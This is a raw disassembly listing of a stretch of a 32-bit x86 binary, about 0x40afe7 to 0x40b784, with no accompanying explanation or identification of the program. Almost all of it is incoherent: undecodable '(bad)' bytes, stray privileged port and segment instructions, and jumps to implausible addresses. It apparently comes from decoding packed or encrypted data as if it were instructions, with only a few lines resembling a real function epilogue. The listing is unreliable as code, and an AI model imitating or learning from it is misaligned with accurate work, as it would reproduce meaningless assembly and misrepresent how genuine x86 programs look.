  40afe7:	shl    DWORD PTR [eax+ebx*4-0x134c49d7],1
  40afee:	imul   edx,DWORD PTR [bp+si-0x2fc6],0xd7011eeb
  40aff7:	in     al,dx
  40aff8:	jae    0x40afbc
  40affa:	jmp    0x1a85d481
  40afff:	mov    ecx,0x1f0385a2
  40b004:	jg     0x40af94
  40b006:	in     eax,dx
  40b007:	pusha  
  40b008:	mov    bl,0x7e
  40b00a:	loope  0x40b039
  40b00c:	adc    eax,0xdb3aa183
  40b011:	sub    bh,BYTE PTR [ecx]
  40b013:	lds    edx,FWORD PTR [edi+0x49]
  40b016:	and    DWORD PTR [ebx],edx
  40b018:	mov    esp,0x56dea91a
  40b01d:	xchg   esp,eax
  40b01e:	(bad)  
  40b01f:	mov    ecx,0x6cd0ef0f
  40b024:	xlat   BYTE PTR ds:[ebx]
  40b025:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40b027:	icebp  
  40b028:	sub    cl,BYTE PTR [edx+esi*1]
  40b02b:	pushf  
  40b02c:	push   ebx
  40b02d:	cli    
  40b02e:	adc    al,0x0
  40b030:	and    al,0xaf
  40b032:	dec    ecx
  40b033:	ins    DWORD PTR es:[edi],dx
  40b034:	dec    edi
  40b035:	sub    ebp,DWORD PTR [esi+0x31]
  40b038:	mov    eax,0xe6290411
  40b03d:	ins    BYTE PTR es:[edi],dx
  40b03e:	pop    edx
  40b03f:	mov    esp,0x4700b86f
  40b044:	sub    DWORD PTR [esp+esi*2+0x2b7b0cd9],0xa9d8f21d
  40b04f:	jl     0x40b0b9
  40b051:	clc    
  40b052:	pusha  
  40b053:	fwait
  40b054:	ss mov eax,0x32fb5ee1
  40b05a:	jg     0x40afe3
  40b05c:	push   ss
  40b05d:	xchg   bl,bl
  40b05f:	call   0x476c1db0
  40b064:	xor    cl,ah
  40b066:	mov    ecx,0xcca20859
  40b06b:	retf   
  40b06c:	mov    ch,0xe6
  40b06e:	sbb    al,0xc2
  40b070:	ins    BYTE PTR es:[edi],dx
  40b071:	fnstsw WORD PTR [ebx-0x33b9d47b]
  40b077:	push   esi
  40b078:	or     DWORD PTR [edx+0x15],ebp
  40b07b:	loope  0x40b039
  40b07d:	xor    eax,DWORD PTR [eax+0x6a8d40bf]
  40b083:	mov    DWORD PTR [ecx-0x77],edi
  40b086:	nop
  40b087:	fnstcw WORD PTR [ecx-0x38]
  40b08a:	push   edx
  40b08b:	dec    eax
  40b08c:	(bad)  
  40b08d:	mov    bh,0x25
  40b08f:	jmp    0x40b088
  40b091:	gs or  al,0xff
  40b094:	inc    esi
  40b095:	jno    0x40b0b8
  40b097:	mov    eax,0x12167025
  40b09c:	sbb    edi,eax
  40b09e:	mov    eax,0xc7c21cf9
  40b0a3:	ret    
  40b0a4:	or     edx,DWORD PTR [esi+0x46b13f85]
  40b0aa:	jo     0x40b094
  40b0ac:	push   edx
  40b0ad:	push   edi
  40b0ae:	(bad)  
  40b0af:	dec    BYTE PTR [edx]
  40b0b1:	icebp  
  40b0b2:	mov    esi,0x37a08aaa
  40b0b7:	cwde   
  40b0b8:	aam    0xe6
  40b0ba:	add    al,0xe0
  40b0bc:	rcl    BYTE PTR [edi+ebx*1],0x9c
  40b0c0:	dec    ebp
  40b0c1:	test   BYTE PTR [esi+0x153158ea],dh
  40b0c7:	sub    DWORD PTR [ebx-0x31],ebx
  40b0ca:	jl     0x40b063
  40b0cc:	daa    
  40b0cd:	idiv   DWORD PTR [esi-0x1760391f]
  40b0d3:	or     bl,BYTE PTR [ebx]
  40b0d5:	out    dx,eax
  40b0d6:	ins    BYTE PTR es:[edi],dx
  40b0d7:	inc    ebx
  40b0d8:	add    eax,0x14d32166
  40b0dd:	jecxz  0x40b146
  40b0df:	inc    edi
  40b0e0:	lods   eax,DWORD PTR ds:[esi]
  40b0e1:	dec    esi
  40b0e2:	cmp    cl,BYTE PTR [ecx+0x64]
  40b0e5:	pop    ss
  40b0e6:	popf   
  40b0e7:	add    eax,0xad9079b4
  40b0ec:	push   0xd
  40b0ee:	push   ds
  40b0ef:	and    ebp,ebp
  40b0f1:	sub    bl,BYTE PTR [ecx]
  40b0f3:	mov    eax,0x3704d5d3
  40b0f8:	push   edi
  40b0f9:	adc    cl,BYTE PTR [edi+0x6e]
  40b0fc:	cmp    dl,BYTE PTR [eax+ebx*2-0x1226d64b]
  40b103:	clc    
  40b104:	out    dx,al
  40b105:	xchg   BYTE PTR [edx],al
  40b107:	int3   
  40b108:	pop    eax
  40b109:	inc    ebx
  40b10a:	outs   dx,BYTE PTR ds:[esi]
  40b10b:	sub    ah,ah
  40b10d:	mov    bh,0x4a
  40b10f:	(bad)  
  40b110:	mov    dl,0xd2
  40b112:	cmp    eax,0x18d4ecff
  40b117:	test   DWORD PTR [esi+0x32b0a66e],ecx
  40b11d:	sub    DWORD PTR cs:[ecx-0x6],esi
  40b121:	lahf   
  40b122:	push   ds
  40b123:	neg    bl
  40b125:	nop
  40b126:	repz jb 0x40b10b
  40b129:	dec    edi
  40b12a:	mov    edi,0xbe55d37a
  40b12f:	aad    0x5e
  40b131:	pop    esp
  40b132:	fs pop eax
  40b134:	mov    al,0xac
  40b136:	jge    0x40b15e
  40b138:	mov    ds:0xc3b977e8,al
  40b13d:	mov    ebx,0xe15c7b9
  40b142:	or     edi,eax
  40b144:	fidiv  DWORD PTR [ecx+0x50e48509]
  40b14a:	addr16 mov ds:0xbec3,eax
  40b14e:	jbe    0x40b181
  40b150:	mov    eax,ecx
  40b152:	add    al,0x1c
  40b154:	mov    ch,0xa8
  40b156:	add    edx,edx
  40b158:	shl    BYTE PTR ds:0x13ba9e1f,0xeb
  40b15f:	or     al,0x9
  40b161:	push   ds
  40b162:	pop    ebx
  40b163:	cmp    al,0x5
  40b165:	or     ebx,DWORD PTR [eax-0x78cb684c]
  40b16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b16c:	mov    cl,0x6f
  40b16e:	xor    eax,esp
  40b170:	or     al,0xde
  40b172:	ds push 0xa38abce
  40b178:	aaa    
  40b179:	loope  0x40b1e3
  40b17b:	fistp  WORD PTR [ecx-0x13]
  40b17e:	xchg   BYTE PTR [esi],cl
  40b180:	sub    bh,bl
  40b182:	sub    DWORD PTR [edi+0x58],0x9cc7f010
  40b189:	or     cl,BYTE PTR [esi+0xba58224]
  40b18f:	jmp    0xe0dfa4b
  40b194:	sbb    eax,0x797e7283
  40b199:	std    
  40b19a:	mov    bl,0x20
  40b19c:	pop    ss
  40b19d:	ret    0xdfdb
  40b1a0:	pop    ds
  40b1a1:	mov    ds:0x6c5cfdcf,al
  40b1a6:	test   bh,bl
  40b1a8:	fdiv   st,st(3)
  40b1aa:	pop    eax
  40b1ab:	daa    
  40b1ac:	or     edx,DWORD PTR [esp+edx*1]
  40b1af:	dec    esi
  40b1b0:	into   
  40b1b1:	data16 adc dh,BYTE PTR ss:[ebp-0x6f]
  40b1b6:	sub    DWORD PTR [ecx+0x45],edi
  40b1b9:	imul   ebx,DWORD PTR [edx-0x20df9901],0x198e03af
  40b1c3:	push   es
  40b1c4:	popa   
  40b1c5:	mov    ah,0x11
  40b1c7:	popf   
  40b1c8:	mov    dl,0xff
  40b1ca:	dec    ebx
  40b1cb:	xor    al,0xe5
  40b1cd:	stos   DWORD PTR es:[edi],eax
  40b1ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1cf:	and    BYTE PTR [eax+0x2096a66e],ah
  40b1d5:	jle    0x40b216
  40b1d7:	popf   
  40b1d8:	pop    eax
  40b1d9:	adc    BYTE PTR [edx],al
  40b1db:	les    esi,FWORD PTR [ebx+0x22573d0d]
  40b1e1:	in     al,0xf1
  40b1e3:	mov    ch,0x7d
  40b1e5:	test   eax,0xece2089a
  40b1ea:	pop    eax
  40b1eb:	cmc    
  40b1ec:	and    esp,ebx
  40b1ee:	xchg   DWORD PTR [esi-0x60661c5b],ebx
  40b1f4:	lods   al,BYTE PTR ds:[esi]
  40b1f5:	out    dx,eax
  40b1f6:	stos   BYTE PTR es:[edi],al
  40b1f7:	fs mov cl,0xce
  40b1fa:	jbe    0x40b241
  40b1fc:	dec    edx
  40b1fd:	cdq    
  40b1fe:	jp     0x40b1b1
  40b200:	jo     0x40b259
  40b202:	inc    ebx
  40b203:	ret    0x213e
  40b206:	hlt    
  40b207:	mov    ?,ecx
  40b209:	xchg   ecx,eax
  40b20a:	xchg   ebx,eax
  40b20b:	xchg   edx,eax
  40b20c:	enter  0xf2ec,0xca
  40b210:	dec    esi
  40b211:	iret   
  40b212:	into   
  40b213:	sahf   
  40b214:	adc    al,0xd8
  40b216:	add    eax,0x964b9693
  40b21b:	add    BYTE PTR [edi+0xe71921e],al
  40b221:	(bad)  
  40b222:	and    eax,0x5167f15b
  40b227:	es mov ebx,0x7005fa9c
  40b22d:	cld    
  40b22e:	push   ss
  40b22f:	loop   0x40b279
  40b231:	ins    BYTE PTR es:[edi],dx
  40b232:	push   es
  40b233:	xchg   DWORD PTR [edx],esp
  40b235:	sbb    dl,BYTE PTR [edx-0x4]
  40b238:	and    esp,eax
  40b23a:	inc    edi
  40b23b:	jg     0x40b1cb
  40b23d:	add    esi,edx
  40b23f:	push   es
  40b240:	xor    dl,dl
  40b242:	scas   al,BYTE PTR es:[edi]
  40b243:	add    dl,BYTE PTR [esi]
  40b245:	or     eax,0x36b06faf
  40b24a:	out    dx,al
  40b24b:	mov    WORD PTR [edx],ss
  40b24d:	imul   ebp,DWORD PTR [ebp+0x78ded7ce],0xffffff9a
  40b254:	dec    esp
  40b255:	mov    ah,0xd6
  40b257:	pusha  
  40b258:	xor    al,0x78
  40b25a:	lea    esp,[eax+0x18]
  40b25d:	sub    BYTE PTR [ebp+edi*4-0x33],dh
  40b261:	pop    ss
  40b262:	test   DWORD PTR [eax+0x72b0db84],edx
  40b268:	xchg   ebx,eax
  40b269:	sbb    eax,0xedb475dd
  40b26e:	mov    DWORD PTR [ebp+0x5deb5bc2],eax
  40b274:	sti    
  40b275:	or     al,0x73
  40b277:	mov    esi,0x23c65ed5
  40b27c:	or     al,0x36
  40b27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b27f:	sbb    BYTE PTR [edi-0x61],bl
  40b282:	mov    al,ds:0x1062cc72
  40b287:	jb     0x40b252
  40b289:	cmc    
  40b28a:	js     0x40b233
  40b28c:	(bad)  
  40b28e:	fwait
  40b28f:	mov    esp,0xe8206f91
  40b294:	cs hlt 
  40b296:	jecxz  0x40b225
  40b298:	mov    esi,0xe40f3ac0
  40b29d:	jno    0x40b22c
  40b29f:	loop   0x40b320
  40b2a1:	into   
  40b2a2:	push   ds
  40b2a3:	xchg   ebx,eax
  40b2a4:	sub    dh,BYTE PTR [edi]
  40b2a6:	loope  0x40b2a9
  40b2a8:	repz xor DWORD PTR [ebx],esp
  40b2ab:	sahf   
  40b2ac:	ror    DWORD PTR ds:0xdb52a2bb,cl
  40b2b2:	xrelease mov DWORD PTR [esi+ebp*2-0x3bb4dbcd],ecx
  40b2ba:	cmp    eax,0x82927a76
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0x9b6b132
  40b2d2:	shl    DWORD PTR [edi-0x32],1
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	push   eax
  40b2dd:	add    eax,0x6f2db01
  40b2e2:	push   esp
  40b2e3:	popf   
  40b2e4:	and    eax,0xe210c97a
  40b2e9:	sbb    BYTE PTR [ebx-0x421ee22a],ch
  40b2ef:	in     eax,0x8f
  40b2f1:	sbb    DWORD PTR [ebp-0x6eb8a51c],eax
  40b2f7:	adc    eax,0xdd4af55
  40b2fc:	push   ebp
  40b2fd:	mov    edx,0xc74504de
  40b302:	pop    ecx
  40b303:	cmp    eax,DWORD PTR [edx]
  40b305:	xor    ch,BYTE PTR [edx-0x5d]
  40b308:	pop    edi
  40b309:	lods   eax,DWORD PTR ds:[esi]
  40b30a:	clc    
  40b30b:	jnp    0x40b2d2
  40b30d:	mov    bh,bl
  40b30f:	in     eax,0x9a
  40b311:	push   eax
  40b312:	mov    ch,0x84
  40b314:	rcl    BYTE PTR [ebx-0x32],cl
  40b317:	xchg   edx,eax
  40b318:	mov    BYTE PTR [ebx+0x5c],bh
  40b31b:	sub    ch,cl
  40b31d:	sti    
  40b31e:	daa    
  40b31f:	mov    edx,DWORD PTR cs:[ecx+0xc094b57]
  40b326:	sub    eax,0x162d78f1
  40b32b:	cdq    
  40b32c:	mov    ds:0xab171788,al
  40b331:	aas    
  40b332:	sar    BYTE PTR [edi+0x1a],0xea
  40b336:	inc    esi
  40b337:	jle    0x40b32b
  40b339:	adc    DWORD PTR [ebx],0xa8a54ac4
  40b33f:	ds pop esp
  40b341:	in     al,dx
  40b342:	push   ss
  40b343:	xor    dh,BYTE PTR [edx]
  40b345:	dec    ebp
  40b346:	dec    ebx
  40b347:	scas   al,BYTE PTR es:[edi]
  40b348:	inc    ebx
  40b349:	xor    esi,esp
  40b34b:	fcomp  DWORD PTR [eax-0x7d]
  40b34e:	out    dx,eax
  40b34f:	or     DWORD PTR [ecx],edx
  40b351:	iret   
  40b352:	xor    BYTE PTR [esi],ch
  40b354:	bound  edi,QWORD PTR ds:0xb6486008
  40b35a:	adc    edi,esi
  40b35c:	inc    eax
  40b35d:	mov    ecx,0xb2d5e1ab
  40b363:	inc    ch
  40b365:	das    
  40b366:	jp     0x40b39d
  40b368:	imul   esi,DWORD PTR [eax],0xfd9b4bee
  40b36e:	into   
  40b36f:	dec    ebx
  40b370:	(bad)  
  40b371:	fbstp  TBYTE PTR [eax-0x35]
  40b374:	test   al,0x80
  40b376:	fdivr  DWORD PTR [ebp+0x39]
  40b379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b37a:	ret    0x1084
  40b37d:	pop    ss
  40b37e:	jl     0x40b348
  40b380:	mov    eax,ds:0x8b261b6f
  40b385:	mov    ecx,ss
  40b387:	gs rcl al,1
  40b38a:	and    al,0xdd
  40b38c:	mov    dl,0x1c
  40b38e:	mov    ah,0x4a
  40b390:	push   ss
  40b391:	pop    ss
  40b392:	sti    
  40b393:	rcl    dh,1
  40b395:	pop    ebp
  40b396:	push   esp
  40b397:	icebp  
  40b398:	push   edi
  40b399:	shr    al,1
  40b39b:	(bad)  
  40b39c:	shl    BYTE PTR [edi+ebx*8-0x6c],0xda
  40b3a1:	pop    esi
  40b3a2:	and    esi,DWORD PTR [ebx-0x7653c140]
  40b3a8:	stc    
  40b3a9:	and    BYTE PTR [esp+ebp*2+0x0],dh
  40b3ad:	jl     0x40b36d
  40b3af:	or     al,0x73
  40b3b1:	pop    ss
  40b3b2:	cmp    bl,ah
  40b3b4:	push   esi
  40b3b5:	sub    eax,0x18839873
  40b3ba:	dec    ecx
  40b3bb:	out    0xd,eax
  40b3bd:	pop    es
  40b3be:	push   ebp
  40b3bf:	xchg   ebx,eax
  40b3c0:	mov    cl,0x10
  40b3c2:	pop    edx
  40b3c3:	mov    edx,0x8019048e
  40b3c8:	call   0x459c:0xfecef54c
  40b3cf:	inc    ebp
  40b3d0:	xchg   esp,eax
  40b3d1:	das    
  40b3d2:	add    eax,0x2be39a19
  40b3d7:	xor    BYTE PTR [edi+0x309cfba5],0x65
  40b3de:	out    0x29,eax
  40b3e0:	xor    BYTE PTR [eax],ah
  40b3e2:	or     eax,0xf6ec7478
  40b3e7:	cld    
  40b3e8:	adc    eax,0x8ffc087f
  40b3ed:	mov    bh,0x3c
  40b3ef:	outs   dx,BYTE PTR ds:[esi]
  40b3f0:	es jmp 0x40b3d0
  40b3f3:	fadd   DWORD PTR cs:[ecx-0x49924d64]
  40b3fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3fb:	mov    ch,0x51
  40b3fd:	stos   BYTE PTR es:[edi],al
  40b3fe:	nop
  40b3ff:	mov    dl,0xb5
  40b401:	js     0x40b442
  40b403:	mov    ebx,0xb116dbb1
  40b408:	cwde   
  40b409:	ins    DWORD PTR es:[edi],dx
  40b40a:	mul    BYTE PTR [edi]
  40b40c:	mov    ch,0xdf
  40b40e:	pop    ecx
  40b40f:	out    dx,al
  40b410:	jae    0x40b3f4
  40b412:	cmp    DWORD PTR [edi-0x59],ecx
  40b415:	pop    eax
  40b416:	imul   esi,edx,0xffffffe6
  40b419:	call   0x9024ec6f
  40b41e:	int3   
  40b41f:	fimul  WORD PTR fs:[edi-0x2450ac17]
  40b426:	jne    0x40b3ca
  40b428:	mov    edx,0x23af4c9
  40b42d:	jge    0x40b458
  40b42f:	mov    ebp,DWORD PTR [eax-0x10f4391d]
  40b435:	jo     0x40b3f4
  40b437:	(bad)  
  40b438:	xor    ecx,DWORD PTR [ebx+ecx*8-0x2d]
  40b43c:	xchg   esi,eax
  40b43d:	add    dh,al
  40b43f:	fnstcw WORD PTR [edi-0x51eca67d]
  40b445:	not    BYTE PTR ds:0x70bdfa1f
  40b44b:	stos   BYTE PTR es:[edi],al
  40b44c:	mov    bh,0x91
  40b44e:	test   BYTE PTR [ebp+0x6e],ch
  40b451:	fadd   DWORD PTR [edi+0x20db872d]
  40b457:	neg    BYTE PTR [ebx]
  40b459:	jle    0x40b3fa
  40b45b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b45c:	sahf   
  40b45d:	push   ecx
  40b45e:	jmp    0x40b47c
  40b460:	loopne 0x40b4a6
  40b462:	sub    ebx,eax
  40b464:	addr16 and eax,0x2191d3cc
  40b46a:	dec    eax
  40b46b:	lods   eax,DWORD PTR ds:[esi]
  40b46d:	retf   
  40b46e:	mov    esp,0xf57ad540
  40b473:	push   esp
  40b474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b475:	daa    
  40b476:	(bad)  
  40b477:	out    0xb,al
  40b479:	aam    0xae
  40b47b:	sahf   
  40b47c:	pop    ebx
  40b47d:	mov    esp,0x4215da40
  40b482:	add    eax,DWORD PTR [edi+0x6c8fab1b]
  40b488:	addr16 aas 
  40b48a:	jns    0x40b4ca
  40b48c:	sti    
  40b48d:	out    0x48,eax
  40b48f:	push   0x3f
  40b491:	ret    0x10b2
  40b494:	or     DWORD PTR [edi+0x4],esi
  40b497:	fiadd  WORD PTR [edx-0x7ffac0c2]
  40b49d:	pushf  
  40b49e:	lods   eax,DWORD PTR ds:[esi]
  40b49f:	inc    edi
  40b4a0:	fisttp WORD PTR [ebp-0x3b]
  40b4a3:	xchg   ebp,eax
  40b4a4:	sub    esp,ecx
  40b4a6:	sbb    esi,ebx
  40b4a8:	mov    al,0xd8
  40b4aa:	jmp    0x40b4ab
  40b4ac:	mov    eax,ds:0xcdc3cb78
  40b4b1:	fisttp DWORD PTR [edi+0x2ca52512]
  40b4b7:	push   ss
  40b4b8:	jge    0x40b523
  40b4ba:	jmp    0x9bba1be7
  40b4bf:	ror    eax,cl
  40b4c1:	cmp    DWORD PTR [ebx],edi
  40b4c3:	mov    ebx,0x865756f6
  40b4c8:	mov    edx,0xd830b162
  40b4cd:	cwde   
  40b4ce:	aam    0x44
  40b4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d1:	xor    BYTE PTR [edx+ebp*1],ah
  40b4d4:	pop    edx
  40b4d5:	leave  
  40b4d6:	push   ecx
  40b4d7:	arpl   WORD PTR [ebx],si
  40b4d9:	and    ch,BYTE PTR [eax+0x59a89641]
  40b4df:	mov    bl,0x42
  40b4e1:	test   DWORD PTR [eax+0xb9d58e4],0xa864f347
  40b4eb:	mov    ebx,0x5049c260
  40b4f0:	xlat   BYTE PTR ds:[ebx]
  40b4f1:	repz mov ebp,0xedcacfd
  40b4f7:	push   0x4e4e921
  40b4fc:	ss or  ax,0xe57f
  40b501:	sbb    bh,ah
  40b503:	mov    edi,0xf0a780e0
  40b508:	push   ss
  40b509:	inc    ecx
  40b50a:	not    BYTE PTR [esi+0xc]
  40b50d:	mov    ebp,0x4524050d
  40b512:	stos   DWORD PTR es:[edi],eax
  40b513:	fild   QWORD PTR [esi]
  40b515:	neg    dl
  40b517:	mov    esi,0xc75e6c4b
  40b51c:	jg     0x40b4a6
  40b51e:	or     eax,0x6d42d7d7
  40b523:	jno    0x40b4c2
  40b525:	ror    BYTE PTR [ebp-0x164687e6],cl
  40b52b:	push   ss
  40b52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b52d:	sbb    al,0x6c
  40b52f:	sbb    al,0x78
  40b531:	in     al,0xbe
  40b533:	add    dl,dh
  40b535:	shl    BYTE PTR [ebp+0x369e14ab],cl
  40b53b:	scas   eax,DWORD PTR es:[edi]
  40b53c:	jne    0x40b4db
  40b53e:	fcmovnu st,st(7)
  40b540:	lahf   
  40b541:	or     DWORD PTR [ecx],ebp
  40b543:	mov    edx,0xace3ca1c
  40b548:	sub    BYTE PTR [eax+0x2c],0x7f
  40b54c:	pop    esi
  40b54d:	jmp    0x40b578
  40b54f:	dec    eax
  40b550:	push   edx
  40b551:	pop    eax
  40b552:	jae    0x40b590
  40b554:	sbb    bh,BYTE PTR [edi]
  40b556:	cs jp  0x40b58b
  40b559:	adc    ecx,ebp
  40b55b:	test   DWORD PTR [ebp-0x56],edi
  40b55e:	ins    DWORD PTR es:[edi],dx
  40b55f:	(bad)  
  40b560:	sbb    DWORD PTR [eax],edx
  40b562:	xchg   ebp,eax
  40b563:	int3   
  40b564:	add    al,0x6
  40b566:	or     eax,0x8159093f
  40b56b:	not    edi
  40b56d:	fwait
  40b56e:	or     al,0xef
  40b570:	fistp  DWORD PTR [ebx]
  40b572:	push   edx
  40b573:	lahf   
  40b574:	repz out 0x66,al
  40b577:	mov    eax,0x33245946
  40b57c:	fdiv   QWORD PTR [edx+0x58]
  40b57f:	mov    eax,ds:0xd3aedde4
  40b584:	jno    0x40b527
  40b586:	ja     0x40b596
  40b588:	ins    BYTE PTR es:[edi],dx
  40b589:	cmp    bh,BYTE PTR [ebx+0x7b55982]
  40b58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b590:	(bad)  
  40b591:	mov    eax,ds:0xab88fffd
  40b596:	add    dl,0x69
  40b599:	ja     0x40b553
  40b59b:	arpl   sp,di
  40b59d:	retf   
  40b59e:	xchg   esi,eax
  40b59f:	not    cl
  40b5a1:	xchg   DWORD PTR [edx],esi
  40b5a3:	in     al,0xd8
  40b5a5:	and    eax,0x4eea1130
  40b5aa:	mov    ebx,0x95a7e43
  40b5af:	push   ds
  40b5b0:	sbb    al,0xba
  40b5b3:	mov    bh,0xd6
  40b5b5:	mov    dl,0xa9
  40b5b7:	dec    edi
  40b5b8:	shr    esi,0x33
  40b5bb:	cld    
  40b5bc:	sbb    ecx,esp
  40b5be:	pop    es
  40b5bf:	mov    al,0x6c
  40b5c1:	xlat   BYTE PTR ds:[ebx]
  40b5c2:	jo     0x40b584
  40b5c4:	cld    
  40b5c5:	stc    
  40b5c6:	les    edi,FWORD PTR [ebx+eax*2+0x33]
  40b5ca:	mov    edi,0x22b57f6a
  40b5cf:	rol    edi,0xae
  40b5d2:	and    DWORD PTR ds:0xf7ee18ab,0xf
  40b5d9:	test   BYTE PTR [edi],dl
  40b5db:	add    BYTE PTR [eax],al
  40b5dd:	add    BYTE PTR [ebx+0x881e445],cl
  40b5e3:	popf   
  40b5e4:	sbb    al,0x75
  40b5e6:	pusha  
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi+0x29ccd584]
  40b60d:	fwait
  40b60e:	(bad)  
  40b60f:	retf   
  40b610:	retf   0x788f
  40b613:	js     0x40b689
  40b615:	jle    0x40b68f
  40b617:	js     0x40b63e
  40b619:	pop    ss
  40b61a:	xor    BYTE PTR ds:0xf51a3b26,bl
  40b620:	and    al,0x77
  40b622:	mov    ebx,edi
  40b624:	(bad)  
  40b625:	mov    fs,WORD PTR [ebx+ecx*1+0x57]
  40b629:	mov    edx,0xf6c6515a
  40b62e:	ret    
  40b62f:	cmp    BYTE PTR [ebx],0x6c
  40b632:	pop    esi
  40b633:	cwde   
  40b634:	aaa    
  40b635:	sub    al,0x17
  40b637:	cmp    dl,dh
  40b639:	xchg   edi,eax
  40b63a:	into   
  40b63b:	imul   eax,eax,0xffffffa9
  40b63e:	out    0xb2,al
  40b640:	rcr    BYTE PTR [eax+0x70],0x87
  40b644:	nop    ebp
  40b647:	cmp    ch,BYTE PTR [ecx-0x2d]
  40b64a:	(bad)  
  40b64b:	mov    eax,0xa7b8e835
  40b650:	xlat   BYTE PTR ds:[ebx]
  40b651:	popf   
  40b652:	into   
  40b653:	ficom  WORD PTR [ecx]
  40b655:	dec    esp
  40b656:	jg     0x40b6d0
  40b658:	jmp    0x2c4:0xefda9fc5
  40b65f:	inc    esi
  40b660:	(bad)  
  40b661:	jmp    0x40b6b4
  40b663:	push   ss
  40b664:	inc    ecx
  40b665:	(bad)  
  40b666:	loopne 0x40b67d
  40b668:	test   BYTE PTR [esi],cl
  40b66a:	shr    DWORD PTR [ecx+0xffa49d2],1
  40b670:	adc    eax,0x7bd8c292
  40b675:	inc    edi
  40b676:	push   ebx
  40b677:	nop
  40b678:	retf   
  40b679:	in     eax,dx
  40b67a:	jnp    0x40b6bb
  40b67c:	mov    WORD PTR [esi+0x3513d639],ds
  40b682:	dec    edi
  40b683:	addr16 push ds
  40b685:	shr    BYTE PTR [ecx+0x37],cl
  40b688:	(bad)  
  40b689:	popf   
  40b68a:	(bad)  
  40b68b:	stc    
  40b68c:	push   edx
  40b68d:	rol    BYTE PTR [esi],1
  40b68f:	jmp    0x5b586999
  40b694:	test   DWORD PTR [eax+0x68],edx
  40b697:	mov    ebx,0xa5ad4044
  40b69c:	out    dx,eax
  40b69d:	(bad)  [ebx-0x604dd539]
  40b6a3:	xor    DWORD PTR [ebp+0x5d67221e],0xad8a831f
  40b6ad:	jmp    0x2ec9:0x7caf03fa
  40b6b4:	jecxz  0x40b6f9
  40b6b6:	push   ss
  40b6b7:	out    dx,eax
  40b6b8:	lods   al,BYTE PTR ds:[esi]
  40b6b9:	inc    edi
  40b6ba:	leave  
  40b6bb:	jno    0x40b72f
  40b6bd:	adc    cl,BYTE PTR [edx-0x425daeef]
  40b6c3:	sahf   
  40b6c4:	dec    ebp
  40b6c5:	aad    0xf
  40b6c7:	(bad)
  40b6cc:	mov    ds:0x19cd114b,eax
  40b6d1:	mov    ebx,0x5f40a345
  40b6d6:	xchg   ebp,eax
  40b6d7:	and    eax,0xe316fbf1
  40b6dc:	pop    ebx
  40b6dd:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40b6df:	dec    ebx
  40b6e0:	and    DWORD PTR [esp+edi*2+0x5133cd73],edx
  40b6e7:	adc    dl,cl
  40b6e9:	sti    
  40b6ea:	mov    eax,ds:0x8437c264
  40b6ef:	jb     0x40b751
  40b6f1:	shl    DWORD PTR [eax-0x5eca9c62],1
  40b6f7:	pop    ecx
  40b6f8:	rol    BYTE PTR [edi-0x4d],1
  40b6fb:	stos   BYTE PTR es:[edi],al
  40b6fc:	jge    0x40b75a
  40b6fe:	sub    al,0xbd
  40b700:	inc    eax
  40b701:	jmp    0x561aebd6
  40b706:	push   edx
  40b707:	popf   
  40b708:	sbb    al,0xef
  40b70a:	inc    esi
  40b70b:	dec    ebp
  40b70c:	in     eax,dx
  40b70d:	adc    edx,edi
  40b70f:	jb     0x40b759
  40b711:	lock xor eax,0xecb32b93
  40b717:	pop    ebp
  40b718:	cmp    al,0xef
  40b71a:	pop    ds
  40b71b:	sub    dh,ah
  40b71d:	call   0x151a:0x47acdb56
  40b724:	fldenv ds:0xaa718db8
  40b72a:	mov    al,ds:0xbcdc6032
  40b72f:	xor    ch,bh
  40b731:	pop    esi
  40b732:	xchg   ecx,ecx
  40b734:	mov    edi,fs
  40b736:	or     eax,0xaa16e0d3
  40b73b:	in     eax,0x5e
  40b73d:	stc    
  40b73e:	(bad)  
  40b740:	mov    al,ds:0xa38b3492
  40b745:	repnz mov ebx,0xdfab2ee
  40b74b:	leave  
  40b74c:	repz ret 0x852f
  40b750:	cmp    DWORD PTR [esp],esi
  40b753:	popf   
  40b754:	in     eax,dx
  40b755:	mov    WORD PTR [ebx-0x3e],ss
  40b758:	out    dx,eax
  40b759:	and    bl,dl
  40b75b:	pop    esi
  40b75c:	push   0xfffffffc
  40b75e:	fidivr DWORD PTR [edi+0x6b]
  40b761:	(bad)  
  40b762:	rcpps  xmm7,XMMWORD PTR [edi-0x153107e8]
  40b769:	repz xchg esp,eax
  40b76b:	jbe    0x40b769
  40b76d:	xor    BYTE PTR [edi],cl
  40b76f:	fs out 0x7e,al
  40b772:	cmp    dl,BYTE PTR [eax+0x50]
  40b775:	cwde   
  40b776:	pop    ecx
  40b777:	pop    esi
  40b778:	mov    cr6,esi
  40b77b:	add    DWORD PTR [eax],0xffffffb7
  40b77e:	push   edi
  40b77f:	pop    es
  40b780:	aam    0xe3
  40b782:	dec    esi
  40b783:	cdq    
  40b784:	push   ss
